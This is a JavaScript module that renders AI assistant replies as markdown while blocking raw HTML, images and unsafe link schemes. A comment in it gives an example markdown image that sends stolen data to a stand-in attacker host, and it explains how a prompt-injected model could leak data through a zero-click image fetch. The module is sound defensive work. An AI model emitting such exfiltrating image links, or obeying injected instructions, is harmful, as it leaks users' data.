import MarkdownIt from 'markdown-it';

const SAFE_LANG = /^[a-z0-9_+#.-]+$/i;
const safeLanguage = (lang) => (lang && SAFE_LANG.test(lang) ? lang : 'text');

/**
 * Schemes allowed to become a live anchor in assistant output. Everything else
 * (javascript:, data:, file:, vbscript:, blob:, relative paths, …) is rendered
 * as inert text. Fail closed: an unrecognised or unparseable href is NOT a link.
 */
const ALLOWED_LINK_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);

export const isSafeExternalHref = (href) => {
  if (typeof href !== 'string') return false;
  const trimmed = href.trim();
  if (!trimmed) return false;
  try {
    // No base URL on purpose — a relative href has nothing sane to resolve
    // against inside a rendered model reply, so it throws and fails closed.
    return ALLOWED_LINK_PROTOCOLS.has(new URL(trimmed).protocol);
  } catch {
    return false;
  }
};

/**
 * `html: false` is load-bearing: assistant output is untrusted text that we
 * inject with dangerouslySetInnerHTML, so raw HTML must never survive the
 * render. The language class is validated too so a crafted fence can't break
 * out of the attribute.
 *
 * `html: false` is NOT enough on its own. Markdown images and links are native
 * markdown syntax, so the raw-HTML rule never applies to them:
 *
 *   - `![](https://attacker.example/p.png?d=<stolen>)` would render a live
 *     `<img src>` and the browser fetches it with ZERO user interaction. A
 *     prompt-injected model (via a response body, a doc, a pasted API spec)
 *     could exfiltrate to an arbitrary host the instant its reply painted.
 *     Every image is therefore replaced with inert text — no `<img>` element
 *     is ever produced, for any scheme, so there is no remote fetch to make.
 *
 *   - `linkify: true` turns bare URLs into anchors. With no target and no
 *     click interception a click is a TOP-LEVEL navigation: the app window
 *     leaves Gridman and `setWindowOpenHandler` never sees it. Links are
 *     restricted to http/https/mailto at render time (validateLink) and every
 *     click inside the markdown container is intercepted by
 *     `handleAssistantLinkClick` below, which hands the URL to the OS browser.
 */
const md = new MarkdownIt({
  html: false,
  breaks: true,
  linkify: true,
  highlight: (str, lang) =>
    `<pre class="code-block"><code class="language-${safeLanguage(lang)}">${md.utils.escapeHtml(str)}</code></pre>`
});

// Applies to inline links, reference links, autolinks AND linkify matches.
// markdown-it drops the construct entirely when this returns false, so a
// rejected href is emitted as literal text rather than as `<a href="">`.
md.validateLink = isSafeExternalHref;

export const BLOCKED_IMAGE_PREFIX = 'image blocked';

// Never emit an <img>. Not for remote URLs, not for data: URIs, not for
// anything — an image tag is a zero-click network fetch and there is no
// version of that we want from untrusted model output.
md.renderer.rules.image = (tokens, idx) => {
  const token = tokens[idx];
  const label = (token.content || token.attrGet('alt') || token.attrGet('src') || '').trim();
  const suffix = label ? `: ${md.utils.escapeHtml(label)}` : '';
  return `<span class="blocked-image" title="Images in AI replies are not loaded">[${BLOCKED_IMAGE_PREFIX}${suffix}]</span>`;
};

const renderToken = (tokens, idx, options, env, self) => self.renderToken(tokens, idx, options, env, self);
const defaultLinkOpen = md.renderer.rules.link_open || renderToken;

md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx];
  // Strip any target the model tried to set and stamp our own marker so the
  // click handler can tell an assistant-rendered anchor from anything else.
  const targetIdx = token.attrIndex('target');
  if (targetIdx >= 0) token.attrs.splice(targetIdx, 1);
  token.attrSet('rel', 'noopener noreferrer nofollow');
  token.attrSet('data-ai-link', '');
  return defaultLinkOpen(tokens, idx, options, env, self);
};

export const renderMarkdown = (content) => md.render(content || '');

/**
 * Click interceptor for the container that hosts rendered assistant markdown.
 *
 * ALWAYS cancels the default action for any anchor inside that container, so
 * no click can navigate the app window away from Gridman — even one whose href
 * we then refuse to open. Safe (http/https/mailto) hrefs are handed to the OS
 * browser through the same `ipcRenderer.openExternal` bridge the rest of the
 * app uses. Returns true only when a URL was actually handed off.
 */
export const handleAssistantLinkClick = (event) => {
  const target = event?.target;
  const anchor = typeof target?.closest === 'function' ? target.closest('a[href]') : null;
  if (!anchor) return false;

  event.preventDefault?.();
  event.stopPropagation?.();

  const href = anchor.getAttribute('href');
  if (!isSafeExternalHref(href)) return false;

  const bridge = typeof window !== 'undefined' ? window.ipcRenderer : null;
  if (typeof bridge?.openExternal !== 'function') return false;
  bridge.openExternal(href);
  return true;
};

/**
 * Split a (possibly still-streaming) assistant message into text and fenced
 * code segments. An unterminated fence yields a segment with `isOpen: true` so
 * the UI can show it as in-progress.
 */
export const parseMessageSegments = (content = '') => {
  if (!content) return [];

  const segments = [];
  let cursor = 0;
  let inCode = false;
  let language = '';

  while (cursor <= content.length) {
    const fenceIndex = content.indexOf('```', cursor);

    if (fenceIndex === -1) {
      const chunk = content.slice(cursor);
      if (inCode || chunk) {
        segments.push({
          type: inCode ? 'code' : 'text',
          content: chunk,
          language,
          isOpen: inCode
        });
      }
      break;
    }

    if (!inCode) {
      const textChunk = content.slice(cursor, fenceIndex);
      if (textChunk) {
        segments.push({ type: 'text', content: textChunk });
      }
      const fenceEnd = fenceIndex + 3;
      const lineEnd = content.indexOf('\n', fenceEnd);
      language = (lineEnd === -1 ? content.slice(fenceEnd) : content.slice(fenceEnd, lineEnd)).trim();
      inCode = true;
      cursor = lineEnd === -1 ? content.length : lineEnd + 1;
    } else {
      const codeChunk = content.slice(cursor, fenceIndex);
      if (codeChunk.trim()) {
        segments.push({ type: 'code', content: codeChunk, language, isOpen: false });
      }
      inCode = false;
      language = '';
      cursor = fenceIndex + 3;
      if (content[cursor] === '\n') cursor += 1;
    }
  }

  return segments.filter((seg) => seg.content && seg.content.trim());
};
